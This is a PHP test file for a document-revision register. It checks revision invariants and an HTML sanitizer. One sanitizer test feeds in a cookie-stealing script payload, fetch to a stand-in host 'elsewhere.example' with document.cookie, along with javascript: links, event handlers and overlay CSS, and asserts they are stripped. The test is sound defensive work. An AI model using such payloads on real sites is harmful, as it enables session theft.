<?php

declare(strict_types=1);

namespace Tests\Feature\Documents;

use App\Engines\Document\ContentSanitizer;
use App\Models\Document;
use App\Models\DocumentCategory;
use App\Models\DocumentVersion;
use App\Models\Organization;
use App\Models\OrgUnit;
use App\Models\User;
use App\Services\DocumentVersionService;
use App\Support\Enums\OrgUnitType;
use Database\Seeders\PermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\Test;
use Tests\Support\BuildsTenants;
use Tests\TestCase;

/**
 * The four invariants the register exists to hold (§26, docs/09).
 *
 *   1. EXACTLY ONE CURRENT REVISION per document, and `documents.current_version_id` names it. The
 *      pointer carries no foreign key — it could not express this rule anyway — so the rule lives
 *      in DocumentVersionService and is asserted here.
 *
 *   2. AN APPROVED REVISION IS IMMUTABLE. Not "should not be edited": the service refuses, because
 *      a policy answers "may this person edit documents" and this answers "may this ROW be edited
 *      at all". Different questions, and only the second one protects the record.
 *
 *   3. THE DRAFT SERIES PROMOTES ONCE. P01, P02 while it is being circulated for comment; Revision
 *      A the moment it is approved. A register that kept "P02" as the issued revision would be
 *      telling a client that a draft is in force.
 *
 *   4. LINEAGE SURVIVES. `derived_from_version_id` records what a revision was started from, which
 *      is not the same as the revision immediately before it whenever two people work in parallel.
 *
 * The sanitizer is tested here too, because it is the one place in the application where user input
 * is deliberately stored as markup — invariant 2 protects the bytes, and the sanitizer is what
 * decides the bytes were safe to keep in the first place.
 */
final class DocumentVersionTest extends TestCase
{
    use BuildsTenants, RefreshDatabase;

    protected string $seeder = PermissionSeeder::class;

    protected bool $seed = true;

    private Organization $org;

    private OrgUnit $civil;

    private DocumentCategory $procedures;

    private User $ngozi;

    protected function setUp(): void
    {
        parent::setUp();

        $this->org = $this->makeOrganization('Meridian Engineering');
        $this->civil = $this->makeUnit($this->org, 'Civil', OrgUnitType::Department);

        $role = $this->makeRole($this->org, 'Document Controller', [
            'document.view' => 'organization',
            'document.create' => 'organization',
            'document.edit' => 'organization',
            'document.manage' => 'organization',
            'document.submit' => 'organization',
            'document.download' => 'organization',
            'org_unit.view' => 'organization',
        ]);

        $this->ngozi = $this->makePerson($this->org, 'Ngozi Eze', $this->civil, [$role]);

        // No approval route: submitting approves outright, which is what lets this file test the
        // revision rules without also testing the workflow engine.
        $this->procedures = $this->makeDocumentCategory($this->org, 'Procedures', [
            'requires_approval' => false,
            'workflow_id' => null,
            'draft_revision_prefix' => 'P',
            'revision_scheme' => 'alpha',
        ]);
    }

    // ------------------------------------------------------------------ invariant 1

    #[Test]
    public function exactly_one_revision_is_current_and_the_document_points_at_it(): void
    {
        $document = $this->procedure();

        $first = $this->makeNativeVersion($this->org, $document, $this->ngozi, '<p>First.</p>');
        $this->approve($document);

        $second = $this->newRevision($document, '<p>Second.</p>');
        $this->approve($document);

        $current = DocumentVersion::query()
            ->where('document_id', $document->id)
            ->where('is_current', true)
            ->get();

        $this->assertCount(1, $current, 'More than one revision claimed to be current.');
        $this->assertSame((int) $second->id, (int) $current->first()->id);
        $this->assertSame((int) $second->id, (int) $document->refresh()->current_version_id);

        // The one it replaced is stamped, not deleted. That stamp is what makes "what was in force
        // in March" answerable.
        $this->assertNotNull($first->refresh()->superseded_at);
        $this->assertFalse((bool) $first->is_current);
    }

    // ------------------------------------------------------------------ invariant 2

    #[Test]
    public function an_approved_revision_cannot_be_edited(): void
    {
        $document = $this->procedure();
        $version = $this->makeNativeVersion($this->org, $document, $this->ngozi, '<p>Shore below 1.2 m.</p>');

        $this->approve($document);
        $version->refresh();

        $this->assertTrue($version->isApproved());

        $this->expectException(\DomainException::class);

        $this->withinOrganization($this->org, fn () => app(DocumentVersionService::class)->updateContent(
            $version,
            ['content_html' => '<p>Shore below 3 m.</p>'],
            $this->ngozi,
        ));
    }

    #[Test]
    public function the_editor_route_refuses_an_approved_revision_too(): void
    {
        $document = $this->procedure();
        $version = $this->makeNativeVersion($this->org, $document, $this->ngozi, '<p>Original text.</p>');

        $this->approve($document);
        $version->refresh();

        // A stale browser tab left open on the editor before the approval came through posts
        // exactly this (§84). The bytes must not move.
        $this->actingFresh($this->ngozi)
            ->put(route('documents.versions.update', [$document, $version]), [
                'content_html' => '<p>Quietly rewritten after approval.</p>',
            ])
            ->assertForbidden();

        $this->assertStringContainsString('Original text.', (string) $version->refresh()->content_html);
    }

    #[Test]
    public function a_draft_revision_can_still_be_edited_in_place(): void
    {
        $document = $this->procedure();
        $version = $this->makeNativeVersion($this->org, $document, $this->ngozi, '<p>First pass.</p>');

        $this->actingFresh($this->ngozi)
            ->put(route('documents.versions.update', [$document, $version]), [
                'content_html' => '<p>Second pass, before anybody reviewed it.</p>',
                'change_summary' => 'Reworked the shoring clause.',
            ])
            ->assertRedirect();

        $this->assertStringContainsString('Second pass', (string) $version->refresh()->content_html);
    }

    // ------------------------------------------------------------------ invariant 3

    #[Test]
    public function the_draft_series_promotes_to_the_issued_series_on_first_approval(): void
    {
        $document = $this->procedure();
        $version = $this->makeNativeVersion($this->org, $document, $this->ngozi);

        // Circulated for comment: P01, and honest about not being issued.
        $this->assertSame('P01', $version->revision);
        $this->assertTrue((bool) $version->is_draft_series);

        $this->approve($document);
        $version->refresh();

        // Approved: Revision A, on the issued series, once and for all.
        $this->assertSame('A', $version->revision);
        $this->assertFalse((bool) $version->is_draft_series);

        // And the next one starts a fresh draft series rather than jumping to B.
        $next = $this->newRevision($document, '<p>Next.</p>');
        $this->assertSame('P01', $next->revision);

        $this->approve($document);
        $this->assertSame('B', $next->refresh()->revision);
    }

    #[Test]
    public function a_register_with_no_draft_series_issues_straight_onto_the_letters(): void
    {
        $drawings = $this->makeDocumentCategory($this->org, 'Drawings', [
            'requires_approval' => false,
            'workflow_id' => null,
            'draft_revision_prefix' => null,
        ]);

        $document = $this->procedure(['document_category_id' => $drawings->id]);
        $version = $this->makeNativeVersion($this->org, $document, $this->ngozi);

        $this->assertSame('A', $version->revision);
        $this->assertFalse((bool) $version->is_draft_series);
    }

    // ------------------------------------------------------------------ invariant 4

    #[Test]
    public function a_revision_records_what_it_was_started_from(): void
    {
        $document = $this->procedure();

        $first = $this->makeNativeVersion($this->org, $document, $this->ngozi, '<p>First.</p>');
        $this->approve($document);

        $second = $this->newRevision($document);

        $this->assertSame((int) $first->id, (int) $second->derived_from_version_id);

        // And it opens on the approved text rather than on a blank page, which is the whole
        // ergonomics of revising a controlled document.
        $this->assertStringContainsString('First.', (string) $second->content_html);
    }

    // ------------------------------------------------------------------ the sanitizer

    #[Test]
    public function authored_content_is_sanitized_on_the_way_in_not_on_the_way_out(): void
    {
        $document = $this->procedure();

        $version = $this->makeNativeVersion(
            $this->org,
            $document,
            $this->ngozi,
            '<p onclick="steal()">Excavation</p>'
            .'<script>fetch("https://elsewhere.example/"+document.cookie)</script>'
            .'<img src="https://elsewhere.example/beacon.png" alt="tracker">'
            .'<a href="javascript:alert(1)">click</a>'
            .'<table><tr><td>Depth</td><td>1.2 m</td></tr></table>',
        );

        $stored = (string) $version->content_html;

        // Stored clean, so every future renderer — editor, PDF, .docx, email — is safe by
        // construction rather than by remembering to filter.
        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onclick', $stored);
        $this->assertStringNotContainsString('javascript:', $stored);
        $this->assertStringNotContainsString('elsewhere.example', $stored);

        // And the legitimate content survives: a sanitizer that ate the table would be useless for
        // engineering documents.
        $this->assertStringContainsString('Excavation', $stored);
        $this->assertStringContainsString('<table', $stored);
        $this->assertStringContainsString('1.2 m', $stored);
    }

    #[Test]
    public function saving_ordinary_authored_markup_raises_no_warnings(): void
    {
        // Regression: every element on the whitelist has to exist in the doctype the purifier is
        // configured with. One that does not raises E_USER_WARNING on every single save — an
        // exception outside production, a log entry per keystroke inside it.
        $sanitizer = app(ContentSanitizer::class);

        $clean = $sanitizer->clean(
            '<h1>Procedure</h1><p><strong>Bold</strong> <em>italic</em> <u>underline</u> <s>struck</s></p>'
            .'<ul><li>One</li><li>Two</li></ul><ol><li>Step</li></ol>'
            .'<blockquote>Quoted</blockquote><pre><code>x = 1</code></pre>'
            .'<table><thead><tr><th scope="col">Item</th></tr></thead>'
            .'<tbody><tr><td colspan="1">Value</td></tr></tbody></table>'
            .'<p style="text-align: center;">Centred</p><hr>',
        );

        $this->assertNotNull($clean);
        $this->assertStringContainsString('<table', $clean);
        $this->assertStringContainsString('text-align', $clean);
    }

    #[Test]
    public function alignment_set_in_the_editor_survives_the_save(): void
    {
        // Regression, and the kind that is only ever reported as "it keeps losing my formatting":
        // the alignment control writes `text-align` onto the paragraph, heading or cell itself, so
        // allowing `style` on span and div alone deleted every alignment on save.
        $sanitizer = app(ContentSanitizer::class);

        $clean = (string) $sanitizer->clean(
            '<h1 style="text-align: center;">Method Statement</h1>'
            .'<p style="text-align: right;">Rev A</p>'
            .'<table><tbody><tr><td style="text-align: center;">1.2 m</td></tr></tbody></table>'
        );

        $this->assertSame(3, substr_count($clean, 'text-align'), 'An alignment was dropped on save.');
        $this->assertStringContainsString('center', $clean);
        $this->assertStringContainsString('right', $clean);

        // Widening the elements must not have widened the properties: anything that can position or
        // overlay is still refused wherever it appears.
        $dangerous = (string) $sanitizer->clean(
            '<p style="position: fixed; top: 0; left: 0; z-index: 9999; opacity: 0.01;">Overlay</p>'
        );

        $this->assertStringNotContainsString('position', $dangerous);
        $this->assertStringNotContainsString('z-index', $dangerous);
        $this->assertStringNotContainsString('opacity', $dangerous);
    }

    #[Test]
    public function an_empty_document_stays_null_rather_than_becoming_an_empty_string(): void
    {
        $sanitizer = app(ContentSanitizer::class);

        $this->assertNull($sanitizer->clean(null));
        $this->assertNull($sanitizer->clean('   '));
        $this->assertSame(0, $sanitizer->wordCount(null));
    }

    #[Test]
    public function the_word_count_is_taken_from_the_cleaned_text_not_the_markup(): void
    {
        $sanitizer = app(ContentSanitizer::class);

        // Four words. The tag names, the attribute values and the stripped script must not count.
        $this->assertSame(4, $sanitizer->wordCount(
            '<p>Shore every deep excavation</p><script>alert(1)</script>'
        ));

        // Block boundaries are word boundaries: "</p><p>" must not weld two words into one.
        $this->assertSame(2, $sanitizer->wordCount('<p>First</p><p>Second</p>'));
    }

    // ------------------------------------------------------------------ fixture

    /** @param array<string,mixed> $attributes */
    private function procedure(array $attributes = []): Document
    {
        return $this->makeDocument($this->org, $this->ngozi, 'Excavation and shoring procedure', [
            'document_category_id' => $this->procedures->id,
            'org_unit_id' => $this->civil->id,
            ...$attributes,
        ]);
    }

    /** A new draft revision, through the same route the "New revision" button posts to. */
    private function newRevision(Document $document, ?string $html = null): DocumentVersion
    {
        $this->actingFresh($this->ngozi)
            ->post(route('documents.versions.store', $document), array_filter([
                'content_html' => $html,
                'change_summary' => 'Next revision.',
            ]))
            ->assertRedirect();

        return DocumentVersion::query()
            ->where('document_id', $document->id)
            ->orderByDesc('id')
            ->firstOrFail();
    }

    /** The register has no route, so submitting approves the outstanding draft outright. */
    private function approve(Document $document): void
    {
        $this->actingFresh($this->ngozi)
            ->post(route('documents.submit', $document))
            ->assertRedirect();
    }
}
